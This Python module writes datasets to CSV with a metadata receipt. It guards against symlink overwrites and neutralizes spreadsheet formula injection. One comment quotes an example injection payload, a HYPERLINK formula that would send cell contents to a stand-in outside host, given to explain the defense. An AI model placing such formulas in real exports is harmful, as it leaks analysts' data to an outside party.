"""Write a dataset to CSV, with a receipt the conversation cannot lose.

The receipt goes back to the caller AND beside the file as .meta.json. The
first satisfies the agent; the second satisfies whoever opens the folder six
months later with no transcript. Both carry the fields most likely to make a
report confidently wrong if they went unstated: whether the response was
sampled, and whether it hit a row limit.
"""

import csv
import datetime
import json
import os
import re

import sessions


class ExportError(Exception):
    """Raised with a message intended to be read by a user, not a developer."""


# The preview exists to let the caller sanity-check the shape of the file, not
# to deliver its contents. It is capped rather than trusted because the caller
# is a language model reading a tool schema: preview_rows=3000 returns a ~29 KB
# receipt and duplicates those rows into the sidecar as well, defeating the one
# promise this module makes -- that a large result never passes through a
# context window.
MAX_PREVIEW_ROWS = 20


def _meta_path_for(path):
    return path[:-4] + ".meta.json" if path.endswith(".csv") else path + ".meta.json"


# O_NOFOLLOW does not exist on Windows, so naming it unconditionally raised
# AttributeError on the first export there. The cheap fix is to delete it, and
# that would be the wrong one -- this guard exists because on 2026-09-02 an
# agent redirected output through a symlink and truncated Homebrew's
# python3.14, breaking every MCP server on the machine.
#
# It is safe to be without, and that was measured rather than assumed:
# O_CREAT|O_EXCL alone already refuses a symlink. On POSIX that is specified.
# On Windows the underlying CREATE_NEW fails whenever the name exists at all,
# symlink, junction or file. So the guarantee lives in O_EXCL; O_NOFOLLOW is
# redundancy, kept wherever the platform offers it.
#
# Assembled once, at import, so a test can assert what the guard is made of
# rather than inferring it from behaviour.
EXCLUSIVE_FLAGS = os.O_WRONLY | os.O_CREAT | os.O_EXCL
if hasattr(os, "O_NOFOLLOW"):
    EXCLUSIVE_FLAGS |= os.O_NOFOLLOW


def _open_exclusively(path):
    """Open `path` for writing, refusing a symlink or an existing file.

    sessions.check_writable validates the *destination*, but the bytes go
    first to `destination + ".ga-tmp"` -- a path nothing else checks, sitting
    in a directory the caller does not necessarily control alone. A symlink
    planted there is followed by a plain open(), which truncates and
    overwrites whatever it points at: the same class of failure that
    destroyed a Homebrew interpreter on 2026-09-02 and gave sessions.py its
    reason to exist.

    O_NOFOLLOW rather than an islink() check on purpose. A check-then-open is
    a TOCTOU race -- the symlink can be planted in the window between the two
    -- while O_NOFOLLOW makes the kernel refuse at open time, with no window
    at all. O_EXCL closes the same hole from the other side (POSIX makes
    O_CREAT|O_EXCL fail on a symlink whether or not its target exists) and
    additionally turns a leftover tmp file from a crashed run into a refusal
    rather than a silent overwrite.

    See EXCLUSIVE_FLAGS for why this still holds where O_NOFOLLOW does not
    exist.
    """
    try:
        return os.open(path, EXCLUSIVE_FLAGS, 0o644)
    except FileExistsError:
        raise ExportError(
            f"Refusing to write through {path}: something is already there. "
            "That is either a leftover temporary file from an interrupted "
            "run, or a symlink pointing somewhere else -- writing through it "
            "could overwrite an unrelated file. Inspect it and delete it, "
            "then re-run -- or, if there is no shell to do that from, export "
            "to a different filename instead.")
    except OSError as exc:
        # ELOOP lands here: O_NOFOLLOW refused a symlink at the final
        # component. So do ordinary permission and read-only-filesystem
        # errors, which need the same "nothing was written" answer.
        raise ExportError(
            f"Could not open {path} for writing ({exc}). If it is a symlink, "
            "it is refused deliberately -- a symlinked destination can point "
            "anywhere, including at a system file.")


# Above this many rows, a result does not belong pasted into a chat reply.
# Michael's number, 2026-10-05. It governs only what is SHOWN -- never what is
# written. The file always gets every row.
CHAT_ROW_THRESHOLD = 2500


def next_step(meta, rows_written):
    """What the model should do with this export, or None if nothing.

    Analysts want complete data, and a model handed rows -- or a limit
    parameter -- will otherwise decide by itself what to cut. This is stated in
    the receipt because a tool's result is the one thing guaranteed to be read
    at the moment of decision; descriptions can be deferred and instructions
    dropped.

    The rule underneath the cut-off branches: cutoffs never touch the DATA, only
    what is shown in chat.
    """
    # Checked first: a file that repeats rows is wrong whatever else is true
    # of it, and every sum taken from it is inflated (#1993).
    repeats = meta.get("duplicate_rows") or 0
    if repeats > 0:
        return (f"REPEATED ROWS: {repeats:,} of the {rows_written:,} rows in "
                "this file repeat another row's full key, which a correct "
                "report never does, so its totals are inflated. Do not analyse "
                "this file. Tell the user, and report it as a bug.")
    reason = meta.get("incomplete_reason")
    matched = meta.get("rows_matched")
    capped = (reason == "caller_limit"
              or (reason is None and meta.get("row_limit_hit")
                  and meta.get("source") == "gsc_search_analytics"))
    if capped:
        of = f" of {matched:,}" if isinstance(matched, int) else ""
        return (f"CAPPED: this file holds {rows_written:,}{of} rows, because a "
                "limit was passed. Analysts want complete data -- unless the "
                "user asked for this cap, re-run without a limit before "
                "reporting anything from it.")
    if (reason == "server_stopped" or meta.get("stopped_reason")
            or meta.get("row_limit_hit")):
        of = f" of {matched:,}" if isinstance(matched, int) else ""
        return (f"INCOMPLETE: this file holds {rows_written:,}{of} rows; the "
                "source stopped before supplying every row. Say so plainly, "
                "and never present it as the whole result.")
    if rows_written > CHAT_ROW_THRESHOLD:
        return (f"Complete: all {rows_written:,} rows are in the file. That is "
                "more than belongs in a chat reply. Summarise from the file, or "
                "ask the user how they want it cut -- but never cut the data "
                "itself. The file keeps every row.")
    return None


# CSV formula injection (#159, 2026-10-25 audit). A spreadsheet treats a
# cell starting with one of these as a formula. Visitors control GA values
# (pagePath, pageTitle, searchTerm, event parameters; anyone can send hits
# with the public measurement ID) and searchers control Search Console
# queries, so =HYPERLINK("https://x/?"&A2, ...) in a page title would run
# when an analyst opens the export in Excel. OWASP's mitigation: prefix such
# cells with a single quote, which spreadsheets show as text.
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
_PLAIN_NUMBER = re.compile(r"^[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?$")


def neutralize_cell(value):
    """value, or "'" + value when a spreadsheet would run it as a formula.

    Plain numbers are left alone, so a negative metric stays a number.
    """
    if (isinstance(value, str) and value.startswith(FORMULA_PREFIXES)
            and not _PLAIN_NUMBER.match(value)):
        return "'" + value
    return value


def neutralize_rows(rows):
    """(rows with formula-like cells neutralized, how many were changed)."""
    changed = 0
    out = []
    for row in rows:
        new = [neutralize_cell(v) for v in row]
        changed += sum(1 for a, b in zip(row, new) if a is not b)
        out.append(new)
    return out, changed


def write_export(path, columns, rows, meta, overwrite=False, preview_rows=5):
    """Write rows to `path` and its sidecar. Returns the receipt.

    `rows` must be a re-iterable sequence (a list), not a one-shot generator
    -- it is iterated three times here (length validation, preview slice,
    then the actual CSV write). A generator would validate cleanly and then
    silently write zero data rows on the second pass.
    """
    try:
        sessions.check_writable(path, overwrite=overwrite)
    except sessions.SessionError as exc:
        raise ExportError(str(exc))

    for i, row in enumerate(rows):
        if len(row) != len(columns):
            raise ExportError(
                f"Row {i} has {len(row)} values but there are "
                f"{len(columns)} columns ({', '.join(columns)}). Refusing to "
                "write a misaligned file.")

    rows, neutralized = neutralize_rows(rows)

    # next_step goes FIRST, so it is the first thing a model reads. #1 was
    # an agent reading straight past a row_count buried mid-payload.
    receipt = {"next_step": next_step(meta, len(rows))}
    receipt.update(meta)
    receipt.update({
        "path": path,
        "meta_path": _meta_path_for(path),
        "columns": list(columns),
        "row_count": len(rows),
        "retrieved_at": datetime.datetime.now().astimezone().isoformat(
            timespec="seconds"),
        "preview": [list(r) for r in
                    rows[:max(0, min(preview_rows, MAX_PREVIEW_ROWS))]],
        # Recorded so the transformation is visible, not silent.
        "formula_cells_neutralized": neutralized,
    })
    if neutralized:
        receipt["formula_note"] = (
            f"{neutralized} cell(s) began with = + - @ or a control "
            "character and were prefixed with ' so a spreadsheet shows them "
            "as text instead of running them. Strip a leading ' to recover "
            "the original value.")

    # encoding="utf-8" is explicit rather than relying on the interpreter's
    # default text encoding -- that default is UTF-8 here (Python 3.14's
    # UTF-8 mode), but is not guaranteed on every Python this module might
    # someday run under. Do not "simplify" this back out.
    tmp = path + ".ga-tmp"
    # Opened before the try: a refusal here means nothing was created, so the
    # cleanup below must not run and unlink whatever is already sitting at
    # tmp -- that file is the evidence the refusal is about.
    fd = _open_exclusively(tmp)
    try:
        with os.fdopen(fd, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(columns)
            writer.writerows(rows)
        os.replace(tmp, path)
    except Exception as exc:
        # Broad on purpose: anything that goes wrong while producing the CSV
        # -- an OSError from the filesystem, but also e.g. a TypeError from
        # something unwritable slipping into `rows` -- must still be
        # translated to ExportError and must still clean up the tmp file.
        # A narrower `except OSError` here previously let non-OSError
        # failures escape unwrapped and skip this cleanup.
        if os.path.exists(tmp):
            try:
                os.unlink(tmp)
            except OSError:
                pass
        raise ExportError(f"Could not write {path} ({exc}). Nothing was left "
                          "behind; re-running is safe.")

    meta_path = receipt["meta_path"]
    meta_tmp = meta_path + ".ga-tmp"
    meta_fd = _open_exclusively(meta_tmp)
    try:
        with os.fdopen(meta_fd, "w", encoding="utf-8") as f:
            json.dump(receipt, f, indent=2)
            f.write("\n")
        os.replace(meta_tmp, meta_path)
    except Exception as exc:
        # Broad for the same reason as above: a non-JSON-serialisable value
        # in `meta` (e.g. a datetime.date) raises TypeError here, not
        # OSError, and must still surface as ExportError rather than a raw
        # Python internals message. Written through a tmp file and
        # os.replace()'d, same as the CSV, so a failed json.dump() can't
        # leave a truncated, invalid-JSON sidecar sitting at meta_path --
        # the message below says the record is missing, so it must actually
        # be missing, not merely corrupt.
        if os.path.exists(meta_tmp):
            try:
                os.unlink(meta_tmp)
            except OSError:
                pass
        raise ExportError(
            f"Wrote {path} but could not write its sidecar "
            f"{meta_path} ({exc}). The data is intact; the "
            "provenance record is missing.")

    return receipt
